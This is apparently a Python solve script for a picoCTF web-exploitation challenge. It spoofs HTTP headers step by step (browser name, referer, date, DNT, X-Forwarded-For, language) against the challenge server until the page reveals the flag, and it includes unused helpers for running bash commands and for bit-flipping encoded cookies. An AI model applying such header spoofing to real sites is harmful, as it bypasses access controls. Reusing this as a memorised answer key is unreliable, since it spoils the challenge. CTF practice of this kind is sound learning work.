import requests

from datetime import datetime

from bs4 import BeautifulSoup

import base64

import subprocess

from tqdm import tqdm

def run_bash(command: list[str]) -> tuple[str, str]:
    command = " ".join(command)

    print(f"Running bash command : `{command}`", end="...")
    
    p = subprocess.Popen(["bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    out, err = p.communicate(command.encode())

    print("Done\n")
    
    try:
        out, err = out.decode(), err.decode()
    except:
        pass

    if not err:
        print("Output received : ")
        print(out or None)
    else:
        print("Error caught : ")
        print(err)

    print()

    return out, err

def password_found(pw: str) -> str:
    name = __file__.split(".")[0]
    
    dir = f"{name}-flag.txt"

    print(f"Password Found : {pw}\n")

    print(f"Saving password to {dir}", end="...")
    
    with open(dir, "w+") as f:
        f.write(pw)

    print("Done\n")

    return dir

def bit_flip(pos: int, bit: int, data: str) -> str:
    raw = base64.b64decode(base64.b64decode(data).decode())
    data = bytearray(raw)
    data[pos] = data[pos] ^ bit
    raw = bytes(data)
    return base64.b64encode(base64.b64encode(raw)).decode()

url = "http://mercury.picoctf.net:38322"

# test 1
r = requests.get(url)

content = r.text

with open("./web exploitation/who-are-you/index1.html", "w+") as f:
    f.write(content)

# test 2
headers = {
    "User-Agent": "PicoBrowser"
}
r = requests.get(url, headers=headers)

content = r.text

with open("./web exploitation/who-are-you/index2.html", "w+") as f:
    f.write(content)

# test 3
headers = {
    "User-Agent": "PicoBrowser", 
    "Referer": "http://mercury.picoctf.net:38322"
}

r = requests.get(url, headers=headers)

content = r.text

with open("./web exploitation/who-are-you/index3.html", "w+") as f:
    f.write(content)

# test 4
headers = {
    "User-Agent": "PicoBrowser", 
    "Referer": "http://mercury.picoctf.net:38322", 
    "Date": datetime(2018, 1 ,1).strftime("%a, %d %b %Y %H:%M:%S GMT")
}

r = requests.get(url, headers=headers)

content = r.text

with open("./web exploitation/who-are-you/index4.html", "w+") as f:
    f.write(content)

# test 5
headers = {
    "User-Agent": "PicoBrowser", 
    "Referer": "http://mercury.picoctf.net:38322", 
    "Date": datetime(2018, 1 ,1).strftime("%a, %d %b %Y %H:%M:%S GMT"),
    "DNT": "1"
}

r = requests.get(url, headers=headers)

content = r.text

with open("./web exploitation/who-are-you/index5.html", "w+") as f:
    f.write(content)

# test 6
headers = {
    "User-Agent": "PicoBrowser", 
    "Referer": "http://mercury.picoctf.net:38322", 
    "Date": datetime(2018, 1 ,1).strftime("%a, %d %b %Y %H:%M:%S GMT"),
    "DNT": "1",
    "X-Forwarded-For": "192.44.242.19",
}

r = requests.get(url, headers=headers)

content = r.text

with open("./web exploitation/who-are-you/index6.html", "w+") as f:
    f.write(content)

# test 7
headers = {
    "User-Agent": "PicoBrowser", 
    "Referer": "http://mercury.picoctf.net:38322", 
    "Date": datetime(2018, 1 ,1).strftime("%a, %d %b %Y %H:%M:%S GMT"),
    "DNT": "1",
    "X-Forwarded-For": "192.44.242.19",
    "Accept-Language": "sv"
}

r = requests.get(url, headers=headers)

content = r.text

with open("./web exploitation/who-are-you/index7.html", "w+") as f:
    f.write(content)

soup = BeautifulSoup(content, features="html.parser")
content = soup.get_text(separator="\n")
content = content.splitlines()

result = [c for c in content if "picoCTF{" in c][0]

dir = password_found(result)